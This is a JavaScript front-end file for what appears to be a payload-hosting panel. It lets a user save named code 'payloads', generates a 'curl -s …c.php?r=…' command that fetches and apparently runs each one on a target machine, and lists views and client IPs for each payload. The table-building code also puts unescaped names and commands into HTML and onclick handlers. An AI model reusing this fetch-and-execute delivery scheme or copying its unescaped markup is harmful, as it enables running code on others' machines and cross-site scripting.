
// Create payload function
function createPayload(){
    var name = $('#createPayloadName').val();
    var lang = $('#createPayloadLanguage').val();
    var lang_name = $("#createPayloadLanguage option:selected").text();
    var code = JSON.stringify($('#createPayloadCode').val());
    var cmd = "curl -s " + location["href"].split("vortex.php")[0] + "c.php?r=" + name + lang;
    if(!lang) {
        M.toast({html: "<span class=\"material-icons icon-toast\">language</span>Please selecte language!", displayLength: 6000});
        return;
    }
    if(lang.search(";") != -1) { cmd = "t=/tmp/0;" + cmd; }

    $.ajax({
        type: 'post',
        url: 'c.php',
        data: { 
            "command": "createPayload",
            "payloadName": name,
            "payloadCode": code,
            "payloadLang": lang_name,
            "payloadCmd": cmd
        },
        success: function (response) {
            if(response.includes("done")) {
                listPayload();
                modalPayload("Payload saved.", cmd);
            }
            M.toast({html: response, displayLength: 6000});
        },
        error: function () {
            alert("error");
        }});
}

// Edit payload function
function editPayload(name) {
    var nameEntry = $("#createPayloadName");
    var codeEntry = $("#createPayloadCode");
    var langEntry = $("#createPayloadLanguage");
 
    $.ajax({
        type: 'post',
        url: 'c.php',
        data: { 
            "command": "listPayload"
        },
        success: function (response) {
            console.log(response);
            payload = JSON.parse(response);
            // Find
            for(i in payload) {
                console.log(payload[i])
                if(payload[i]["name"] == "payloads/" + name + ".json") {
                    break;
                }
            }
            // Stats
            //var lang_name   = payload["lang"];
            //var run_command = payload["cmd"];
            var code = payload[i]["code"];
            var name = payload[i]["name"].split('/').slice(-1)[0].split('.')[0];
            // Set
            codeEntry.val(code);
            nameEntry.val(name);

            
        },
        error: function () {
            alert("error");
        }});

}

// Delete payload function
function deletePayload(name) {
    $.ajax({
        type: 'post',
        url: 'c.php',
        data: { 
            "command": "removePayload",
            "payloadName": name
        },
        success: function (response) {
            $("#row_" + name).fadeOut();
            M.toast({html: response, displayLength: 4000});
        },
        error: function () {
            alert("error");
        }});
}

// List of payloads function
function listPayload() {
    var table = $(".listPayloadTable");
    table.find("tbody tr").remove();

    $.ajax({
        type: 'post',
        url: 'c.php',
        data: { 
            "command": "listPayload"
        },
        success: function (response) {
            var list = JSON.parse(response);
            for(payload in list){
                name        = list[payload]["name"].split('/').slice(-1)[0].split('.')[0];
                lang_name   = list[payload]["lang"];
                run_command = list[payload]["cmd"];
                views       = list[payload]["views"];
                clients     = list[payload]["ips"];

                table.append(
                    "<tr id=\"row_" + name + "\"><td>" + name + "</td>" +
                    "<td>" + clients.join(',<br>') + "</td>" +
                    "<td>" + views + "</td>" +
                    "<td>" + 
                    '<span data-position=\'left\' data-tooltip=\'Click to edit payload\' onclick=\"editPayload(\'' + name + '\');\" class=\"material-icons T_edit tooltipped\">create</span>' +
                    '<span data-position=\'bottom\' data-tooltip=\'Click to get command\' onclick=\"modalPayload(\'Command to execute payload.\', \'' + run_command + '\');\" class=\"material-icons T_command tooltipped\">storage</span>' +
                    '<span data-position=\'right\' data-tooltip=\'Click to remove\' onclick=\"deletePayload(\'' + name + '\');\" class=\"material-icons T_trashbin tooltipped\">delete_forever</span>' +
                    
                    "</td></tr>"
                    );
                // Reload tooltips
                $('.tooltipped').tooltip();
            }
        },
        error: function () {
            alert("error");
        }});
}

// Copy to clipboard
function copyPayloadCommand() {
    var inputCommand = $("#modalPayloadCommand");
    inputCommand.focus();
    inputCommand.select();
    document.execCommand("copy");
    M.toast({html: "<span class=\"material-icons toast-icon\">assignment</span> Copied to clipboard", displayLength: 1000});
}

// Show modal
function modalPayload(text, command) {
    $('.modalPayloadInfo').text(text);
    $('#modalPayloadCommand').val(command);
    M.Modal.getInstance($('#modalPayload')).open()
}

// Init materialize css
$(document).ready(function(){
    // navbar
    $('.sidenav').sidenav();
    // select
    $('select').formSelect();
    // Modal
    $('.modal').modal();
    // tooltips
    $('.tooltipped').tooltip();
});